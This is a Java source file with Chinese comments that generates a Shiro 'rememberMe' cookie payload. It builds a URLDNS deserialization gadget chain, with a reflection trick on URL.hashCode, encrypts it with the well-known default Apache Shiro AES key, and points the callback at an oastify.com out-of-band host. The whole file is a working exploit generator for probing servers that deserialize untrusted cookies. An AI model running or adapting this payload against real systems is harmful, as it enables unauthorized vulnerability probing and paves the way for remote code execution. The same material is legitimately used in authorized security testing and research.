
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.Random;

public class Main {
    private static final String DEFAULT_KEY_B64 = "kPH+bIxk5D2deZiIxcaaaA==";

    public static void main(String[] args) throws Exception {
        String dnsUrl = "http://ccc.jaysenscan.rsnhdeclvkmtdwvqdzetcizep5vwjt7i.oastify.com";
        String payload = genURLDNS(dnsUrl);
        System.out.println("rememberMe=" + payload);
    }

    /**
     * 生成 URLDNS 反序列化链的字节数组
     */
    private static String genURLDNS(String urlStr) throws Exception {
        // 实例化 URL 对象，此时 hashCode = -1
        URL url = new URL(urlStr);
        // 通过反射将 hashCode 设为非 -1，避免 put 时触发真正的 DNS 查询
        Field hashCodeField = URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, 0); // 任意非 -1 值
        // 放入 HashMap
        HashMap<URL, String> map = new HashMap<>();
        map.put(url, "foo");
        // 恢复 hashCode 为 -1，保证反序列化后重新计算 hashCode 触发 DNS 查询
        hashCodeField.set(url, -1);
        // 序列化 HashMap
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();

        // Aes加密
        byte[] key = Base64.getDecoder().decode(DEFAULT_KEY_B64);
        byte[] iv = new byte[16];
        new Random().nextBytes(iv);                     // 随机 IV
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        byte[] encrypted = cipher.doFinal(baos.toByteArray());
        // 拼接 IV + 密文，再 Base64 编码
        byte[] combined = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
        return Base64.getEncoder().encodeToString(combined);
    }
}
